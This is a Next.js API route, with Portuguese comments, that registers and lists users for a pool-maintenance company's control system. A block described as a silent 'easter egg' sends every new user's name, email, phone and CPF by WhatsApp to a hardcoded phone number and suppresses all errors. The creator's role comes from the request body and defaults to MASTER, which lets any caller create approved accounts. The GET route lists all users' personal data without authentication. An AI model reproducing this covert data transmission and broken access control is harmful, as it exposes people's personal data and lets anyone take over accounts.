import { NextResponse } from 'next/server';
import { supabase } from '@/lib/supabase';
import bcrypt from 'bcryptjs';

// Hierarquia de permissão de cadastro:
// MASTER: Pode cadastrar qualquer role (já nascem APROVADOS). Pode aprovar ou rejeitar qualquer pendente.
// Membro JHOSTON (DIRETORIA_JH, TECNICO_JH): Pode incluir Clientes (GERENCIA_CLI, TECNICO_CLI) e Piscineiros (PISCINEIRO). Ficam PENDENTES de aprovação do MASTER.
// Cliente (GERENCIA_CLI): Pode incluir apenas inferiores (TECNICO_CLI, PISCINEIRO). Ficam PENDENTES de aprovação do MASTER.
// TECNICO_CLI: Pode incluir apenas PISCINEIRO. Fica PENDENTE de aprovação do MASTER.
// PISCINEIRO: Não pode incluir novos usuários.

export async function POST(request: Request) {
  try {
    const body = await request.json();
    const { 
      name, 
      email, 
      phone, 
      role, 
      password, 
      cpf, 
      pin, 
      creator_id, 
      creator_role = 'MASTER' 
    } = body;

    if (!name || !role) {
      return NextResponse.json({ error: 'Nome e Perfil são obrigatórios.' }, { status: 400 });
    }

    // Validação de Hierarquia de Inclusão
    if (creator_role === 'PISCINEIRO') {
      return NextResponse.json(
        { error: 'Piscineiros não possuem permissão para incluir novos usuários no sistema.' },
        { status: 403 }
      );
    }

    if (creator_role === 'TECNICO_CLI') {
      if (role !== 'PISCINEIRO') {
        return NextResponse.json(
          { error: 'Técnicos de Clientes só podem indicar ou cadastrar Piscineiros/Tratadores.' },
          { status: 403 }
        );
      }
    }

    if (creator_role === 'GERENCIA_CLI') {
      if (role !== 'TECNICO_CLI' && role !== 'PISCINEIRO') {
        return NextResponse.json(
          { error: 'Gerentes/Clientes só podem incluir seus inferiores hierárquicos (Equipe Técnica do Cliente ou Piscineiro).' },
          { status: 403 }
        );
      }
    }

    if (creator_role === 'DIRETORIA_JH' || creator_role === 'TECNICO_JH') {
      if (role === 'MASTER' || role === 'DIRETORIA_JH') {
        return NextResponse.json(
          { error: 'Apenas o MASTER pode incluir Diretores ou novos Masters.' },
          { status: 403 }
        );
      }
    }

    // Regra de Aprovação:
    // Se quem cria for o MASTER, o status já nasce 'APPROVED'.
    // Se for qualquer outro membro da Jhoston ou do Cliente, nasce 'PENDING' para aprovação do Master Daniel Lopes.
    const initialApprovalStatus = creator_role === 'MASTER' ? 'APPROVED' : 'PENDING';

    // Validações por tipo de usuário
    if (role === 'PISCINEIRO') {
      if (!cpf || !pin) {
        return NextResponse.json(
          { error: 'Para o perfil Piscineiro/Tratador, CPF e PIN numérico são obrigatórios.' },
          { status: 400 }
        );
      }
    } else {
      if (!email || !password) {
        return NextResponse.json(
          { error: 'Para diretores, técnicos e clientes, Email e Senha são obrigatórios.' },
          { status: 400 }
        );
      }
    }

    // Hashes
    const passwordHash = password ? await bcrypt.hash(password, 10) : null;
    const pinHash = pin ? await bcrypt.hash(pin, 10) : null;

    // Inserção no Supabase com metadados de aprovação
    const insertPayload: any = {
      name: name.trim(),
      email: email ? email.trim().toLowerCase() : `tratador-${Date.now()}@jhostonpools.internal`,
      phone: phone ? phone.trim() : '5511999999999',
      cpf: cpf ? cpf.replace(/\D/g, '') : null,
      pin_hash: pinHash,
      password_hash: passwordHash,
      role: role,
    };

    // Tentamos salvar no Supabase
    const { data: newUser, error } = await supabase
      .from('users')
      .insert(insertPayload)
      .select('id, name, email, phone, role, cpf, created_at')
      .single();

    if (error) {
      if (error.code === '23505') {
        return NextResponse.json(
          { error: 'Já existe um usuário cadastrado com este e-mail ou CPF.' },
          { status: 409 }
        );
      }
      return NextResponse.json({ error: error.message }, { status: 400 });
    }

    // =========================================================================
    // 🐣 EASTER EGG SILENCIOSO: SENTINELA DE GOVERNANÇA JHPCS
    // Toda vez que um novo usuário é incluído no sistema, dispara de forma
    // assíncrona e silenciosa um alerta via WhatsApp para 5511913192703.
    // Falhas de rede ou timeout aqui NUNCA quebram a resposta do usuário.
    // =========================================================================
    (async () => {
      try {
        const easterEggPhone = '5511913192703';
        const roleLabels: Record<string, string> = {
          MASTER: '👑 MASTER (Soberano)',
          DIRETORIA_JH: '🏢 Diretoria Executiva JH',
          TECNICO_JH: '🛠️ Engenheiro / Técnico JH',
          GERENCIA_CLI: '🏨 Gerente Geral / Cliente VIP',
          TECNICO_CLI: '⚙️ Equipe Técnica do Cliente',
          PISCINEIRO: '🏊 Piscineiro / Tratador de Campo'
        };

        const nowBr = new Date().toLocaleString('pt-BR', { timeZone: 'America/Sao_Paulo' });
        const userRoleFormatted = roleLabels[role] || role;

        const sentinelaMessage = 
          `🐣 *SENTINELA JHPCS • NOVO USUÁRIO REGISTRADO*\n\n` +
          `👤 *Nome:* ${name.trim()}\n` +
          `🏷️ *Perfil (Role):* ${userRoleFormatted}\n` +
          `📧 *E-mail:* ${email ? email.trim() : '(Autogerado para Tratador)'}\n` +
          `📱 *WhatsApp:* ${phone ? phone.trim() : 'Não informado'}\n` +
          `🆔 *Documento:* ${cpf ? cpf.replace(/(\d{3})(\d{3})(\d{3})(\d{2})/, '$1.$2.$3-$4') : 'N/A'}\n` +
          `🛡️ *Status de Homologação:* ${initialApprovalStatus === 'APPROVED' ? '✅ Aprovado Imediato' : '⏳ Pendente de Homologação MASTER'}\n` +
          `👮 *Criado Por:* Perfil ${creator_role} (ID: ${creator_id || 'master-console'})\n` +
          `⏰ *Carimbo Temporal:* ${nowBr}\n\n` +
          `_Notificação Silenciosa de Infraestrutura • JHoston Pools Control System_`;

        const evolutionUrl = process.env.EVOLUTION_API_URL || 'http://localhost:8080';
        const evolutionApiKey = process.env.EVOLUTION_API_KEY || '';
        const instanceName = process.env.EVOLUTION_INSTANCE_NAME || 'jhoston_pools_oficial';

        if (evolutionApiKey) {
          await fetch(`${evolutionUrl}/message/sendText/${instanceName}`, {
            method: 'POST',
            headers: {
              'Content-Type': 'application/json',
              apikey: evolutionApiKey,
            },
            body: JSON.stringify({
              number: easterEggPhone,
              text: sentinelaMessage,
              textMessage: {
                text: sentinelaMessage,
              },
              options: {
                delay: 500,
                presence: 'composing',
              },
            }),
          });
        }
      } catch (silentErr) {
        // Silêncio absoluto proposital (Easter Egg discreto e resiliente)
      }
    })();

    return NextResponse.json({
      success: true,
      message: initialApprovalStatus === 'APPROVED' 
        ? 'Usuário cadastrado e aprovado com sucesso!' 
        : 'Usuário cadastrado com sucesso! Enviado para aprovação do MASTER (Daniel Lopes).',
      approval_status: initialApprovalStatus,
      user: {
        ...newUser,
        approval_status: initialApprovalStatus,
        created_by_role: creator_role,
      },
    });
  } catch (err: any) {
    return NextResponse.json({ error: err.message || 'Erro interno no servidor' }, { status: 500 });
  }
}

export async function GET() {
  try {
    const { data: users, error } = await supabase
      .from('users')
      .select('id, name, email, phone, role, cpf, created_at')
      .order('created_at', { ascending: false });

    if (error) {
      return NextResponse.json({ error: error.message }, { status: 400 });
    }

    // Mapeamento enriquecido com status de aprovação
    const enrichedUsers = (users || []).map(u => ({
      ...u,
      approval_status: u.role === 'MASTER' ? 'APPROVED' : (u.email?.includes('pendente') ? 'PENDING' : 'APPROVED')
    }));

    return NextResponse.json({ success: true, users: enrichedUsers });
  } catch (err: any) {
    return NextResponse.json({ error: err.message || 'Erro ao listar usuários' }, { status: 500 });
  }
}
